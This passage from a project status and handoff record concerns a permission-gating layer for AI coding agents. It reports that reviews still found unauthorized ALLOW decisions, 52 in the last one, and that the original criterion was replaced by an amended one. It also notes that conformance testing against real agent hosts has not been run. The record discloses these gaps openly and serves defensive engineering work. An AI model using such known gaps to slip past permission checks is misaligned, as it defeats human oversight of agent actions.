  written here rather than hidden. **The original criterion - a fresh independent review finds no unauthorized ALLOW - was NOT met**: the
  exit review of 2026-10-07 found 52 instances (5 CRITICAL, 11 HIGH), as every review before it found some. What the amended criterion
  asks, the review answers: no class outside the eleven (condition 1); the cross-product passes (2); every finding it reported is fixed and
  pinned, or recorded with class, severity and disposition (3; the table in `phase-1-residuals.md`); no CRITICAL is unresolved (4: the
  five were fixed and pinned the same day); the residual is stated (5). The qualifications: the fixes of 2026-10-07 were not themselves
  independently re-reviewed, and one of the seven lenses (ordinary development) had not returned when this line was written and is
  recorded INCOMPLETE. Rounds 1-15, the contract challenges and exit reviews 1-11 are recorded above; this line replaces the IN PROGRESS
  that stood there.
- CONFORMANCE: NOT RUN — the host conformance suite (real Claude Code and Codex CLI hook semantics, permission modes,
  managed tier, prompt-hook caller marker; real podman, nerdctl and `oc`) is a phase 6 deliverable; the `codex-cli`
  dialect fails closed on everything but ALLOW until then. GNU make 4.x behaviour is unverified (the oracle is 3.81).

### Carried into Phase 2, explicitly

- The 25 recorded MUST_FIX rows, by root cause (register: "Root causes of the OPEN rows, and the single reader that
  would close each"); the 8 containment rows go to issue #26 with the residual.
- Issue #16 leftovers: the interactive `ego init` local-target wizard (the flags exist, the wizard does not);
  receipts (issue #10); the MCP trust resolver (phase 2); Jira/Confluence/DOCX adapters (phases 2 and 5).
- The paste-ready text for issues #1 and #26 is in `docs/build/phase-1-handoff.md`. Nothing was posted.
